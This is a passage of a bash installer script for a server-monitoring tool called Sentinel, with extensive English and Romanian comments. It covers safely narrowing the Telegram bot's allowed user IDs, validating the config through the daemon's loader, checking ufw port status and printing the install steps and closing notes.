            if (rest == "") pending = 1
            next
        }
        # `exit` from a main-loop action does not stop the program — it jumps
        # to END, which then runs regardless. A first draft had an
        # unconditional `exit 1` in END, which clobbered the `exit 0` set
        # here on every genuinely block-form input and always reported
        # "not ambiguous" — falsified by feeding it exactly that shape.
        # `decided` is what makes END defer to a verdict already reached.
        #
        # Two shapes fall through this without stopping the search, both
        # legal YAML: a blank or full-line-comment line between the key and
        # its first item (the item is still the value of that key, not a
        # reason to give up), and a sequence item at the OWN INDENT OF THE
        # KEY itself — YAML never requires a block sequence to be indented
        # past its parent key; assuming it always would be is what left this
        # shape undetected. Missing either meant this function said "not
        # block form" on a genuinely block-form file, and the rewrite path
        # below then replaced the key line and left its items dangling as
        # invalid YAML.
        pending {
            if ($0 ~ /^[ \t]*$/ || $0 ~ ("^" indent "[ \t]*#")) next
            decided = 1
            if ($0 ~ ("^" indent "(  )?-[ \t]")) exit 0
            exit 1
        }
        END { if (!decided) exit 1 }
    ' "$yaml"
}

# Prints the COMPLETE new file content on stdout — every line copied through
# unchanged except the one that carries `allowed_user_ids`, which is either
# rewritten in place or, if absent, appended as the last child of the
# `telegram:` block. The caller decides whether anything actually changed by
# comparing this output to the original file as STRINGS (never `cmp`:
# diffutils is not on a minimal RHEL image — see journal_write_dropin's own
# comment for the run that discovered this the hard way).
#
# A trailing `# comment` already on the `allowed_user_ids` line survives,
# because an operator who annotated it by hand did not ask for the annotation
# to be a casualty of narrowing who may act.
#
# Blank lines inside `telegram:` while the key is still unhandled are BUFFERED,
# not printed immediately, and flushed only after the insertion (or at EOF).
# Both live hosts separate `telegram:` from the next section with a blank
# line, so without buffering the appended key would print right before that
# blank line's next non-blank neighbour — the NEXT section's first key — and
# land visually attached to the wrong block, valid YAML but wrong on sight to
# whoever opens the file next. Buffering keeps the insertion adjacent to the
# keys it actually belongs with and reproduces the blank line after it,
# unmoved.
telegram_allowed_user_ids_rewrite() {
    local yaml="$1" indent="$2" newval="$3"
    awk -v indent="$indent" -v newval="$newval" '
        BEGIN { in_tg = 0; handled = 0; blanks = 0 }
        function flush_blanks(    i) { for (i = 0; i < blanks; i++) print ""; blanks = 0 }
        /^[ \t]*$/ && in_tg && !handled { blanks++; next }
        /^[^ \t#]/ {
            if (in_tg && !handled) {
                print indent "allowed_user_ids: " newval
                handled = 1
            }
            flush_blanks()
            in_tg = ($0 ~ /^telegram:[ \t]*$/)
            print
            next
        }
        in_tg && !handled && index($0, indent "allowed_user_ids:") == 1 {
            handled = 1
            flush_blanks()
            rest = substr($0, length(indent "allowed_user_ids:") + 1)
            sub(/^[ \t]+/, "", rest)
            comment = ""
            if (substr(rest, 1, 1) == "[") {
                close_at = index(rest, "]")
                if (close_at > 0) {
                    comment = substr(rest, close_at + 1)
                    sub(/^[ \t]+/, "", comment)
                }
            } else if (substr(rest, 1, 1) == "#") {
                comment = rest
            }
            out = indent "allowed_user_ids: " newval
            if (comment != "") out = out "  " comment
            print out
            next
        }
        # Flushes here too, not just at the two explicit call sites above:
        # any ordinary content line reached this far means the blank run
        # that preceded it (if any) was a gap BETWEEN two real lines, not a
        # trailing gap before the insertion point, and must reappear exactly
        # where it was. Without this, every blank line anywhere inside
        # telegram: before the key is found gets swept up into ONE buffer
        # and dumped together wherever handling finally happens — deleting
        # every interior blank line and duplicating the trailing one.
        { flush_blanks(); print }
        END {
            if (in_tg && !handled) print indent "allowed_user_ids: " newval
            flush_blanks()
        }
    ' "$yaml"
}

# Runs the codebase's OWN loader — sentinel.config.load_config, the exact
# function sentinel-telegram calls at its own startup — against $1, and
# confirms it deserialises telegram.allowed_user_ids to EXACTLY [$2].
#
# Not `sentinel config-check`: that proves the file is valid YAML that
# satisfies the Config dataclass, which is necessary but not what this step
# needs proof of. It needs proof that the specific key it just wrote is the
# specific value it meant to write, through the same parsing the daemon uses
# on itself — a syntax check alone would pass just as happily over a value
# written to the wrong key, or coerced to the wrong id, and call it done.
#
# Exit status distinguishes three things, on purpose, the way this whole
# repository insists "unknown" and "wrong" must stay distinguishable:
#   0  confirmed — the file parses and the id matches
#   1  the file is invalid, OR it is valid but the id does not match
#   2  could not evaluate at all (the venv or sentinel.config is unreachable)
# A caller that folded 2 into 1 would report "the config is wrong" about a
# venv it never managed to ask.
#
# What that distinction does NOT cover: the python script below reaches its
# own `sys.exit(2)` only once the interpreter is already running — if
# "${SENTINEL_PREFIX}/venv/bin/python" itself does not exist, the shell fails
# to exec it before any of that runs, and the whole command substitution
# returns 127, a value this function never produces on purpose. The caller's
# `elif (( rc != 0 ))` folds THAT into "candidatul respins de loaderul
# Sentinel" — the same "config is wrong" misreport the paragraph above says
# a caller must not make, just reached through an interpreter that was never
# there to ask rather than through sentinel.config being unreachable inside
# one that was. Left unreachable on purpose rather than given a real rc=127
# branch: step_package (step 24, before this one on every install and every
# redeploy) already dies on a missing or broken venv interpreter — see its
# own `executor.policy is not importable` check — so no host that got this
# far can hand step 42 an rc of 127 to mishandle.
telegram_config_loads_with_owner() {
    local path="$1" want="$2"
    # PYTHONPATH set explicitly, the same as step_deploy_package's import
    # check (:1765) and the `bin/sentinel` wrapper it writes (:1781) — the
    # package lives at "${SENTINEL_PREFIX}/lib" with no site-packages install
    # and no .pth, so a bare venv interpreter cannot see it. Without this,
    # EVERY call here returns rc=2 on both live hosts, and the caller's rc=2
    # branch was written to warn loudly about exactly that — but a step whose
    # own verification path never once resolves the package it claims to
    # check has not verified anything; it has confirmed its own intent to.
    env PYTHONPATH="${SENTINEL_PREFIX}/lib" "${SENTINEL_PREFIX}/venv/bin/python" -c '
import sys
from pathlib import Path
try:
    from sentinel.config import load_config
    from sentinel.errors import ConfigError
except Exception as exc:
    print(f"cannot import sentinel.config: {exc}", file=sys.stderr)
    sys.exit(2)
path, want = Path(sys.argv[1]), int(sys.argv[2])
try:
    cfg = load_config(path)
except ConfigError as exc:
    print(f"config invalid: {exc}", file=sys.stderr)
    sys.exit(1)
got = list(cfg.telegram.allowed_user_ids)
if got != [want]:
    print(f"telegram.allowed_user_ids parsed to {len(got)} id(s), not the one "
          f"just written", file=sys.stderr)
    sys.exit(1)
' "$path" "$want"
}

step_telegram_owner() {
    local target="${SENTINEL_CONFIG_DIR}/sentinel.yaml"
    local user_id
    user_id="$(secrets_get TELEGRAM_OWNER_USER_ID)"
    # Read from stdin FIRST, the file on disk SECOND — the same order and the
    # same reason as everywhere else this pattern appears: an operator who
    # supplies the key on a re-run where step 27 is already marked done (so
    # its own write to secrets.env never runs this time) must still see this
    # step act on it THIS run, not be told to also remember --force-step 27.
    [[ -n "$user_id" ]] || user_id="$(existing_secret TELEGRAM_OWNER_USER_ID || true)"

    if [[ -z "$user_id" ]]; then
        warn "TELEGRAM_OWNER_USER_ID nu a fost furnizat — telegram.allowed_user_ids \
NU e atins. Pe orice gazdă unde allowed_chat_ids conține un GRUP, oricine din grupul \
ăla poate încă bloca, debloca și aproba patch-uri (docs/TELEGRAM.md §2, §8). Adaugă \
TELEGRAM_OWNER_USER_ID în secrets/.env.local și repornește deploy-ul."
        closing_note "Telegram: allowed_user_ids nu e restrâns (TELEGRAM_OWNER_USER_ID \
lipsă din secrets) — orice membru al grupurilor din allowed_chat_ids poate acționa"
        return 0
    fi

    # Spelled out digit by digit, not `[0-9]`, and LC_ALL=C set as a LOCAL —
    # never `LC_ALL=C [[ …` as a prefix, which does nothing because `[[` is a
    # keyword and takes no env assignment in front of it.
    #
    # Corrected 25 September 2026: an earlier version of this comment claimed
    # `[0-9]` under a UTF-8 locale is a collation range that also matches
    # fullwidth and Arabic-Indic digits. Measured directly on both live hosts
    # (en_US.UTF-8, C.UTF-8, en_US.utf8, C; glibc 2.34 and 2.39, bytes of the
    # fullwidth string confirmed ef bc 99 ef bc 91 ef bc 98): `[[ ９１８ =~
    # ^[0-9]+$ ]]` is `nomatch` in every one of those combinations. `[0-9]`
    # does not let a value like that through here, on either host, in any
    # locale tried — the earlier claim was never checked against a real
    # glibc and was wrong.
    #
    # The guard stays anyway, spelled out and under LC_ALL=C, for a reason
    # that does not depend on that claim: `sentinel.config._coerce_list_items`
    # already requires `isinstance(item, int)`, so `load_config` refuses a
    # non-numeric id on its own, guard or no guard — but its message is
    # "candidatul nu se încarcă…", which tells the operator nothing about
    # WHAT is wrong with the secret. This regex exists to say that, before
    # the file is even touched, not to stop something the loader would
    # otherwise let through.
    local LC_ALL=C
    if [[ ! "$user_id" =~ ^[123456789][0123456789]*$ ]]; then
        warn "TELEGRAM_OWNER_USER_ID nu arată ca un id numeric Telegram (cifre, fără \
semn) — telegram.allowed_user_ids NU e atins. Corectează valoarea în \
secrets/.env.local și repornește deploy-ul."
        closing_note "Telegram: allowed_user_ids nu e restrâns (TELEGRAM_OWNER_USER_ID \
nu arată ca un id numeric) — orice membru al grupurilor din allowed_chat_ids poate \
acționa"
        return 0
    fi

    if [[ ! -f "$target" ]]; then
        warn "${target} nu există — pasul de configurare (26) trebuie să ruleze \
întâi; allowed_user_ids NU e atins"
        closing_note "Telegram: allowed_user_ids nu e restrâns (${target} nu există \
încă) — orice membru al grupurilor din allowed_chat_ids poate acționa"
        return 0
    fi

    # `|| indent=""`, not a bare assignment: under `set -e` (this whole
    # installer runs under it, via common.sh) a plain `x="$(cmd)"` whose
    # command exits non-zero kills the process right there, before the
    # emptiness check below ever runs — turning an awk bug in this new code
    # into a hard abort of the entire install instead of the graceful "cannot
    # verify, do not touch it" this step exists to be.
    local indent
    indent="$(telegram_allowed_user_ids_indent "$target")" || indent=""
    if [[ -z "$indent" ]]; then
        warn "${target}: nu găsesc 'telegram: / enabled:' — structura nu e cea \
așteptată, allowed_user_ids NU e atins"
        closing_note "Telegram: allowed_user_ids nu e restrâns (${target} nu are \
structura 'telegram: / enabled:' așteptată) — orice membru al grupurilor din \
allowed_chat_ids poate acționa"
        return 0
    fi

    if telegram_allowed_user_ids_is_block_form "$target" "$indent"; then
        warn "${target}: allowed_user_ids e deja scris ca listă pe mai multe linii — \
formă pe care acest pas nu o rescrie, ca să nu ghicească. Editeaz-o manual la o \
singură linie 'allowed_user_ids: [...]' și rulează din nou cu --force-step 42."
        closing_note "Telegram: allowed_user_ids nu e restrâns (scris ca listă pe mai \
multe linii, pasul 42 nu îl rescrie) — orice membru al grupurilor din allowed_chat_ids \
poate acționa"
        return 0
    fi

    # `$(…)` strips EVERY trailing newline, not just one — so a file that
    # ends "…\n\n" (a real trailing blank line; the live prod sentinel.yaml
    # is exactly this shape) comes back from a bare `$(cat …)` with BOTH
    # gone, indistinguishable from a file that ends "…\n". A hardcoded
    # `printf '%s\n'` at write time then reliably puts back exactly one,
    # silently deleting whichever blank line the operator's file actually
    # had. Appending a byte `$(…)` cannot mistake for a newline, and never
    # legal in this YAML, pins the true trailing bytes in place across the
    # capture; stripping that one byte back off afterward is exact because
    # nothing else in the file could have put it there.
    local current desired eof_pin=$'\x01'
    current="$(cat "$target" 2>/dev/null && printf '%s' "$eof_pin")" \
        || {
        warn "${target} nu poate fi citit — allowed_user_ids NU e atins"
        closing_note "Telegram: allowed_user_ids nu e restrâns (${target} nu a putut fi \
citit) — orice membru al grupurilor din allowed_chat_ids poate acționa"
        return 0
    }
    current="${current%"$eof_pin"}"
    # Same `set -e` reasoning as the indent lookup above: a failure here must
    # warn and return, not take the whole install down with it. The `&&` before
    # the pin (not `;`) matters just as much here: on a `;` a failing rewrite
    # would still let `printf` run and succeed, so the command substitution's
    # own exit status would report 0 and this `if !` would never fire.
    if ! desired="$(telegram_allowed_user_ids_rewrite "$target" "$indent" "[${user_id}]" \
            && printf '%s' "$eof_pin")"; then
        warn "${target}: rescrierea lui allowed_user_ids a eșuat — NU e atins"
        closing_note "Telegram: allowed_user_ids nu e restrâns (rescrierea a eșuat) — \
orice membru al grupurilor din allowed_chat_ids poate acționa"
        return 0
    fi
    desired="${desired%"$eof_pin"}"
    if [[ -z "$desired" ]]; then
        warn "${target}: rescrierea lui allowed_user_ids a produs un fișier gol — \
NU e atins"
        closing_note "Telegram: allowed_user_ids nu e restrâns (rescrierea a produs un \
fișier gol) — orice membru al grupurilor din allowed_chat_ids poate acționa"
        return 0
    fi

    if [[ "$current" == "$desired" ]]; then
        ok "telegram.allowed_user_ids e deja restrâns la proprietar — nimic de făcut"
        return 0
    fi

    local tmp="${target}.telegram_owner.tmp" rc=0
    # No added trailing newline here: $desired already carries the exact
    # trailing bytes telegram_allowed_user_ids_rewrite produced (preserved by
    # the eof_pin capture above), which already mirrors the source file's own
    # ending. Appending another '\n' unconditionally is the write-side half
    # of the same bug the capture just fixed on the read side.
    printf '%s' "$desired" > "$tmp"

    # Validate the CANDIDATE, through the daemon's own loader, BEFORE it
    # becomes the live file. A sentinel.yaml edited into invalid YAML and
    # restarted into takes down the alerting channel — CLAUDE.md's own table
    # has a row for exactly this mistake, made a different way.
    telegram_config_loads_with_owner "$tmp" "$user_id" || rc=$?
    if (( rc == 2 )); then
        rm -f "$tmp"
        warn "nu pot verifica ${target} prin propriul loader al Sentinel — venv-ul sau \
sentinel.config nu se pot atinge de aici. allowed_user_ids NU e atins. Vezi mesajul \
de mai sus."
        closing_note "Telegram: allowed_user_ids nu e restrâns (loaderul Sentinel nu a \
putut fi atins ca să valideze candidatul) — orice membru al grupurilor din \
allowed_chat_ids poate acționa"
        return 0
    elif (( rc != 0 )); then
        rm -f "$tmp"
        warn "candidatul pentru ${target} nu se încarcă drept telegram.allowed_user_ids \
= [${user_id}] prin propriul loader al Sentinel — NU e atins, fișierul rămâne cel \
vechi. Vezi mesajul de mai sus."
        closing_note "Telegram: allowed_user_ids nu e restrâns (candidatul respins de \
loaderul Sentinel) — orice membru al grupurilor din allowed_chat_ids poate acționa"
        return 0
    fi

    install -m 0640 -o root -g "${SENTINEL_USER}" "$tmp" "$target"
    rm -f "$tmp"
    ok "scris ${target}: telegram.allowed_user_ids restrâns la proprietar"

    # Made discoverable on purpose, not left for whoever finds it later: pe
    # ambele gazde vii, allowed_chat_ids conține DOAR grupul — niciun chat
    # privat. Dacă id-ul furnizat aici e greșit, NIMENI, nici operatorul real,
    # nu mai poate da comenzi în acel grup (`_authorized` din
    # sentinel/telegram/bot.py îngustează pe expeditor și refuză pe oricine nu
    # se potrivește) — dar alertele tot pleacă: `_broadcast` trimite pe
    # `allowed_chat_ids` direct, fără să treacă prin `allowed_user_ids`, deci
    # canalul de ieșire nu e atins. Raza exploziei e comenzile, nu alertele.
    # Recuperarea nu trece prin bot: ssh pe gazdă, corectează
    # TELEGRAM_OWNER_USER_ID în secrets/.env.local și redeployează (sau
    # editează manual allowed_user_ids în ${target} și
    # 'systemctl restart sentinel-telegram').
    closing_note "Telegram: allowed_user_ids restrâns la un singur id. Dacă e greșit, \
comenzile din grup sunt blocate pentru toată lumea (alertele tot pleacă) — recuperare: \
ssh pe gazdă, corectează TELEGRAM_OWNER_USER_ID și redeployează, sau editează manual \
${target} și repornește sentinel-telegram"

    # Through `systemctl`, not `[[ -f /etc/systemd/system/… ]]` — the other
    # hard-coded-path check this file uses elsewhere (step_start_services) is
    # correct there and untested anywhere in this repository for exactly the
    # reason a stub cannot reach a real path under /etc: this asks the one
    # thing already crossing an executable boundary, which a test can replace.
    if ! systemctl list-unit-files 'sentinel-telegram.service' --no-legend --no-pager \
            2>/dev/null | grep -q .; then
        info "sentinel-telegram.service nu e instalat — nimic de repornit"
        return 0
    fi
    if ! systemctl is-active --quiet sentinel-telegram 2>/dev/null; then
        info "sentinel-telegram nu rulează acum — fișierul e scris, valoarea nouă se \
aplică la următoarea pornire a serviciului"
        return 0
    fi

    systemctl restart sentinel-telegram || die "sentinel-telegram nu a pornit după \
scrierea lui allowed_user_ids. journalctl -u sentinel-telegram -n 50"

    # `systemctl restart` returning 0 spune doar că semnalul a plecat, nu că
    # procesul a rămas pornit — aceeași poartă ca la pasul 32, cu același
    # motiv: un proces care moare la pornire și e repornit de systemd trece
    # prin `active` la fiecare ciclu, iar o verificare care se uită o dată îl
    # prinde exact acolo.
    local before now_state waited=0 nrestarts
    before="$(systemctl show sentinel-telegram -p NRestarts --value 2>/dev/null)"
    while (( waited < SERVICE_SETTLE_S )); do
        sleep 1; waited=$((waited + 1))
        now_state="$(systemctl is-active sentinel-telegram 2>/dev/null || true)"
        if [[ "$now_state" != "active" ]]; then
            journalctl -u sentinel-telegram -n 40 --no-pager >&2
            die "sentinel-telegram nu a rămas pornit după schimbarea lui \
allowed_user_ids: după ${waited}s e '${now_state:-necunoscut}'. Vezi \
journalctl -u sentinel-telegram -n 50"
        fi
        nrestarts="$(systemctl show sentinel-telegram -p NRestarts --value 2>/dev/null)"
        if [[ "$nrestarts" != "$before" ]]; then
            journalctl -u sentinel-telegram -n 40 --no-pager >&2
            die "sentinel-telegram se repornește în buclă după schimbarea lui \
allowed_user_ids: ${before} → ${nrestarts} reporniri în ${waited}s"
        fi
    done

    # Proof of EFFECT, not of the exit code above: re-read the file the
    # unit was actually started against, through the same loader, one more
    # time. The daemon loads its config once, at process start, and nothing
    # between `install` and here touches this file again — so "the file on
    # disk now parses to the id just written" and "the running process holds
    # that id" are the same fact, not two that merely tend to agree.
    rc=0
    telegram_config_loads_with_owner "$target" "$user_id" || rc=$?
    if (( rc != 0 )); then
        die "sentinel-telegram a rămas pornit și stabil ${SERVICE_SETTLE_S}s, dar \
${target} nu se mai încarcă drept telegram.allowed_user_ids = [${user_id}] prin \
propriul loader al Sentinel. Verifică manual: \
${SENTINEL_PREFIX}/bin/sentinel config-check -v"
    fi

    ok "sentinel-telegram repornit cu allowed_user_ids nou, activ și stabil \
${SERVICE_SETTLE_S}s (${before:-?} reporniri) — verificat prin propriul loader al \
Sentinel, nu prin codul de ieșire al restart-ului"
}

# ---------------------------------------------------------------------------
# Ce mai stă între operator și panou — strâns pe parcurs, tipărit LA FINAL
# ---------------------------------------------------------------------------
#
# Avertismentul despre ufw există de mult în preflight și e corect (vezi
# comentariul lung de la deploy/preflight.sh:327). Defectul nu e el: e locul
# unde apare. Trece pe ecran la minutul doi al unei instalări de un sfert de
# oră, iar rularea se termină cu „Instalare completă". Operatorul citește
# ultimul lucru de pe ecran, nu al treilea, și pleacă spre un panou care nu
# răspunde. Condițiile se strâng aici și se tipăresc ultimele, cu comanda
# exactă.
#
# Două liste, fiindcă sunt două lucruri diferite: ce BLOCHEAZĂ accesul, și ce
# trebuie ȘTIUT despre postura cu care a rămas gazda. A le amesteca ar pune un
# fapt de securitate în lista de „de reparat" sau invers.
PENDING_OBSTACLES=()
CLOSING_NOTES=()

obstacle()     { PENDING_OBSTACLES+=("$1"); }
closing_note() { CLOSING_NOTES+=("$1"); }

# ufw, RE-măsurat la final, nu reluat din decizia pasului 1.
#
# Între preflight și banner trec sferturi de oră, iar operatorului i s-a spus
# la minutul doi să deschidă portul. Dacă a făcut-o între timp, a-i repeta
# instrucțiunea e o minciună mică exact acolo unde tocmai am promis adevărul.
#
# Patru stări, fiindcă „nu se poate citi" nu e „e în regulă":
#   0  ufw blochează portul
#   1  nu-l blochează (inactiv, politică implicită allow, sau regulă existentă)
#   2  ufw e acolo dar starea lui nu s-a putut citi
#   3  întrebarea nu se pune (ufw nu e instalat, sau mod shared, unde Sentinel
#      nu deschide niciun port propriu)
#
# Tiparele de grep sunt aceleași cu ale preflight-ului, deliberat: două
# răspunsuri diferite la aceeași întrebare, pe aceeași rulare, ar fi mai rău
# decât niciunul.
ufw_blocks_public_port() {
    have ufw || return 3
    [[ "$NGINX_MODE" == "shared" ]] && return 3
    local state
    state="$(ufw status verbose 2>/dev/null || true)"
    [[ -n "$state" ]] || return 2
    grep -qi '^Status: active' <<< "$state" || return 1
    grep -qE '^Default:[^,]*allow \(incoming\)' <<< "$state" && return 1
    grep -qE "^${PUBLIC_PORT}(/tcp)?([[:space:]]+\(v6\))?[[:space:]]+ALLOW" <<< "$state" && return 1
    return 0
}

report_closing_facts() {
    # Postura se recalculează AICI, din configurația rulării, nu se memorează
    # la pasul 33: pasul e în ALWAYS_STEPS azi, dar dacă vreodată nu mai e,
    # nota ar dispărea tăcut de pe ecran exact pe gazdele deja instalate.
    if [[ "$NGINX_MODE" != "shared" && -z "$DOMAIN" ]]; then
        closing_note "Panoul de pe :${PUBLIC_PORT} răspunde la ORICE Host, inclusiv la un \
scan pe IP gol. Fără --domain instalatorul nu are de unde ști numele prin care ajungi la
      mașină, iar a-l ghici e exact ce a făcut ca fiecare cerere să primească 444. Ca să-l
      îngustezi la un singur nume, re-rulează instalarea cu:
          --domain <numele-prin-care-deschizi-panoul>"
    fi

    # --allow-ufw NU e o a cincea stare măsurată — portul e închis la fel în
    # amândouă cazurile. E răspunsul la altceva: dacă operatorul a ALES asta.
    #
    # `preflight.sh` deosebește deja cele două (liniile 378 și 383), și
    # deosebirea e purtătoare: „or if the dashboard is meant to be reached only
    # through an ssh tunnel, in which case the port SHOULD stay closed and this
    # is the right answer, not a workaround." Pe gazda n8n exact așa se ajunge
    # la panou, fiindcă HSTS pe :443 face certificatul autosemnat de pe :8443
    # inutilizabil în browser — iar `deploy.ps1 -AllowUfw` trimite ALLOW_UFW=1
    # la fiecare livrare.
    #
    # Fără ramura asta, ultimul lucru de pe ecran îi cerea operatorului să
    # anuleze o decizie pe care tocmai o luase. Tot rostul mutării rezumatului
    # la final a fost ca un avertisment adevărat să nu mai treacă neobservat;
    # n-are voie să devină unul fals.
    local ufw_state=0
    ufw_blocks_public_port || ufw_state=$?
    if (( ufw_state == 0 )) && [[ "${ALLOW_UFW:-0}" == "1" ]]; then
        closing_note "Portul ${PUBLIC_PORT} e ÎNCHIS în ufw și ai cerut --allow-ufw, deci a \
rămas așa intenționat. Panoul nu răspunde din afară — ceea ce e răspunsul CORECT dacă ajungi
      la el printr-un tunel ssh, nu ceva de reparat. Dacă totuși vrei să răspundă din afară:
          sudo ufw allow ${PUBLIC_PORT}/tcp
      sau, doar pentru adresa ta:
          sudo ufw allow from <ip-ul-tău> to any port ${PUBLIC_PORT} proto tcp"
        ufw_state=4
    fi
    case $ufw_state in
        0) obstacle "ufw e ACTIV și nicio regulă din el nu lasă ${PUBLIC_PORT}/tcp să intre. \
Panoul nu răspunde din afară până rulezi:
          sudo ufw allow ${PUBLIC_PORT}/tcp
      sau, doar pentru adresa ta:
          sudo ufw allow from <ip-ul-tău> to any port ${PUBLIC_PORT} proto tcp
      Sentinel nu umblă în firewall-ul tău, deci comanda asta rămâne a ta." ;;
        2) obstacle "ufw e instalat, dar starea lui NU s-a putut citi acum, deci dacă lasă \
${PUBLIC_PORT}/tcp să intre e NECUNOSCUT — nu „în regulă\". Verifică:
          sudo ufw status verbose" ;;
    esac

    (( ${#CLOSING_NOTES[@]} + ${#PENDING_OBSTACLES[@]} )) || return 0

    local item
    if (( ${#CLOSING_NOTES[@]} )); then
        printf '\n  DE ȘTIUT:\n'
        for item in "${CLOSING_NOTES[@]}"; do printf '\n   *  %s\n' "$item"; done
    fi
    if (( ${#PENDING_OBSTACLES[@]} )); then
        printf '\n  CE MAI STĂ ÎNTRE TINE ȘI PANOU:\n'
        for item in "${PENDING_OBSTACLES[@]}"; do printf '\n   *  %s\n' "$item"; done
    fi
    printf '\n'
}

# ===========================================================================
main() {
    section "Sentinel installer"
    log "  version : $(cat "${SRC_ROOT}/VERSION" 2>/dev/null || echo unknown)"
    log "  host    : $(hostname -f 2>/dev/null || hostname)"
    log "  domain  : ${DOMAIN:-<none>}"
    log "  snapshot: ${SNAPSHOT_DIR}"

    lockout_warning
    confirm "Continui cu instalarea?" || die "aborted by the operator"

    # Unconditional, before the first step_done check of any kind: creates
    # $STATE_MARKERS (0700 root:root) before anything is written into it.
    #
    # An upgrade from a host installed before 2026-09-08 has its markers
    # sitting at the OLD location (${SENTINEL_STATE_DIR}/.install-state,
    # under a directory `sentinel` can write to) and this deliberately does
    # NOT move them here. Three rounds tried to make that move safe and each
    # was beaten by a different bypass of the same shape — see the comment on
    # SENTINEL_INSTALL_STATE_DIR in deploy/lib/common.sh. The cost is that
    # step_done sees nothing done and every marker-gated step below re-runs
    # once on that host's first deploy past this fix. Every one of those
    # steps is written to be safe to re-run (that is this whole mechanism's
    # contract — see "Idempotency" in deploy/lib/common.sh); the one place a
    # re-run is NOT a no-op is the write-once nginx_preexisting fact, handled
    # separately at nginx_preexisting_resolve below.
    ensure_state_markers_dir

    run_step  1 preflight         step_preflight

    # Unconditional, every run — NOT a step. It sets in-process state (PUBLIC_PORT,
    # ADMIN_IP, SURICATA_OK, nginx mode) that later steps read, and that state does
    # not survive as a marker. Gating it is what broke shared-mode resumes.
    resolve_config

    run_step 18 snapshot          step_snapshot
    run_step 19 user_and_dirs     step_user_and_dirs

    # Necondiționat — vezi comentariul de la definiția funcției, lângă
    # `step_user_and_dirs`.
    ensure_tmpfiles_applied

    # Necondiționat, la fiecare rulare — NU un pas, exact ca `resolve_config` și
    # `ensure_instance_id`. Motivele, pe larg, la definiția funcției: pasul 26
    # (ALWAYS) scrie `scan.containers` din măsurătoarea asta, iar docker poate
    # apărea pe gazdă oricând după ziua instalării, când pasul 19 e demult marcat.
    #
    # Aici, și nu mai jos: systemd rezolvă grupurile suplimentare la PORNIREA
    # unității. Pasul 32 repornește unitățile, deci o apartenență acordată după el
    # n-ar ajunge la niciun proces până la deploy-ul următor.
    ensure_docker_access

    run_step 20 packages          step_packages
    run_step 21 external_tools    step_external_tools
    run_step 22 postgres          step_postgres
    run_step 23 venv              step_venv
    run_step 24 package           step_package
    run_step 25 claude_workspace  step_claude_workspace
    run_step 26 configs           step_configs
    run_step 27 secrets           step_secrets

    # Necondiționat, la fiecare rulare — NU un pas, exact ca `resolve_config`.
    #
    # A stat până acum ÎN pasul 27, iar asta a fost o greșeală cu consecință
    # măsurată pe gazda de producție: pasul 27 e marcat ca făcut din ziua
    # instalării și NU e în ALWAYS_STEPS, deci pe orice gazdă instalată înainte
    # ca identitatea să existe, apelul nu se atingea niciodată. Comanda de
    # actualizare din docs/DEPLOYMENT.md §7 nu trece `--force-step 27` și nimic
    # nu o obliga; în schimb `step_start_services` (ALWAYS) repornea beaconul
    # oricum. Rezultat: cod nou, fișier inexistent, beacon repornit direct în
    # tăcere, iar martorul suna o alarmă critică despre un server sănătos.
    # Documentația nu putea repara asta — o gazdă nu citește documentație.
    #
    # De ce nu un pas nou: un număr nou ar muta numerele tuturor pașilor de după
    # el, adică ar invalida fiecare `--force-step N` din documentație, din
    # DEPANARE.md și din istoricul comenzilor operatorului.
    #
    # De ce nu `secrets` în ALWAYS_STEPS: pasul ăla citește stdin și rescrie
    # /etc/sentinel/secrets.env de la zero. Rularea lui la fiecare deploy e
    # exact operația pentru care există toată mașinăria de păstrare a cheilor,
    # și n-are nicio legătură cu identitatea.
    #
    # Sigur de rulat oricând: `ensure_instance_id` e idempotentă și refuză
    # explicit să regenereze o identitate existentă — vezi corpul ei. Asta e
    # chiar proprietatea pentru care a fost scrisă așa.
    ensure_instance_id

    run_step 28 migrate           step_migrate
    run_step 29 nftables          step_nftables
    run_step 30 systemd           step_systemd
    run_step 31 discovery         step_discovery
    run_step 32 start_services    step_start_services
    if [[ "$NGINX_MODE" == "shared" ]]; then
        run_step 33 nginx_shared  step_nginx_shared
    else
        run_step 33 nginx         step_nginx
    fi
    run_step 34 admin_user        step_admin_user
    run_step 35 suricata          step_suricata
    run_step 36 deploy_account    step_deploy_account
    run_step 37 auxiliary         step_auxiliary
    run_step 38 smoke_test        step_smoke_test
    run_step 39 verify_intact     step_verify_nothing_broken
    run_step 41 journal_storage   step_journal_storage
    run_step 40 notify            step_notify
    run_step 42 telegram_owner    step_telegram_owner

    # Before the success banner, not after it: what the run declined to do, and
    # whether what it was told to force actually ran. `assert_forced_steps_ran`
    # can end the run here, which is the point — "installation finished" printed
    # over an unperformed request is what sent an operator away believing a
    # password had been rotated when it had not.
    report_marked_skips
    assert_forced_steps_ran

    section "Instalare completă"
    # Cu --domain, URL-ul e numele pe care vhost-ul chiar îl servește și pe
    # care verificarea de la pasul 33 l-a cerut efectiv.
    #
    # Fără --domain NU EXISTĂ nume: vhost-ul e `default_server` și răspunde la
    # orice Host, deci singurul lucru adevărat de tipărit e o adresă a gazdei.
    # Un `hostname -f` aici ar fi chiar ghicitul care a produs pana — pe gazda
    # de producție întoarce n8n.example.com, iar operatorul ajunge la
    # mașină prin cu totul alt nume. Nota din report_closing_facts spune că
    # merge orice Host, deci adresa nu e o îngustare, e un exemplu care chiar
    # se deschide.
    local banner_host
    if [[ -n "$DOMAIN" ]]; then
        banner_host="$DOMAIN"
    else
        # Prima adresă IPv4 globală. `|| true` peste tot lanțul: `grep -v` fără
        # potrivire iese 1, iar `head -1` închide conducta devreme — sub
        # `pipefail` oricare dintre ele ar opri instalarea completă în bară.
        banner_host="$( { public_ips | grep -v ':' | head -1; } 2>/dev/null || true)"
        [[ -n "$banner_host" ]] || banner_host="$(hostname -f 2>/dev/null || hostname)"
    fi
    cat <<EOF

  Dashboard   : https://${banner_host}$( [[ "$NGINX_MODE" == "shared" ]] || printf ':%s' "$PUBLIC_PORT" )
  Mod nginx   : ${NGINX_MODE}
  Config      : ${SENTINEL_CONFIG_DIR}/sentinel.yaml
  Inventar    : ${SENTINEL_CONFIG_DIR}/inventory.yaml   <- REVIZUIEȘTE
  Loguri      : journalctl -fu 'sentinel-*'
  Snapshot    : ${SNAPSHOT_DIR}
  Rollback    : ${SCRIPT_DIR}/rollback.sh ${SNAPSHOT_DIR}

  AUTO-BLOCK ESTE DEZACTIVAT. Primele 72h sunt în mod „observă": primești pe
  Telegram ce AR FI fost blocat, cu buton. După ce verifici că nu apar
  fals-pozitive (monitoare uptime, Let's Encrypt, crawlere, IP-ul tău mobil),
  activează-l:

